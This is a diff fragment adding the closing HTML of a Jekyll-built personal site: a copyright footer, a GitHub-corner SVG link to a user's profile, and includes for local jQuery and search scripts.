+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
